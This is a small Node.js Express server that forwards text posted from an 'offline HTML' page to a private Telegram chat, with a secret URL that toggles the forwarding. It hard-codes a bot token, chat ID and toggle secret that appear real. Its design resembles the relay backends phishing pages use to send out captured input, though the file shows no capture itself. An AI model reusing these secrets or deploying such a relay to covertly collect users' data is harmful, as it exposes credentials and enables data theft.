const express = require('express');
const fetch = require('node-fetch').default;
const app = express();
app.use(express.json({ limit: '10mb' }));

// ==== CHANGE THESE ====
const BOT_TOKEN      = '8400227074:AAFIF2dQB3T227vw7HGI_2n1d6oCjxxQ3Tw';          // get from @BotFather
const CHAT_ID        = '6438423314';
const TOGGLE_SECRET  = '062588af89beeca91219db6d41237cab'; // e.g. use https://generate-secret.now.sh/32
// ======================

let loggingEnabled = true;

const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// 1. Receive log from offline HTML
app.post('/log', async (req, res) => {
  if (!loggingEnabled) {
    return res.json({ status: 'blocked' });
  }

  const { text } = req.body;
  if (!text) return res.status(400).json({ error: 'missing text' });

  try {
    await fetch(TELEGRAM_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });
    res.json({ status: 'sent' });
  } catch (e) {
    console.error(e);
    res.json({ status: 'error', msg: e.message });
  }
});

// 2. Toggle ON/OFF
app.get('/toggle/:secret', (req, res) => {
  if (req.params.secret !== TOGGLE_SECRET) {
    return res.status(403).send('Forbidden');
  }
  loggingEnabled = !loggingEnabled;
  res.send(`Logging <b>${loggingEnabled ? 'ENABLED' : 'DISABLED'}</b>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Gatekeeper running on ${PORT}`));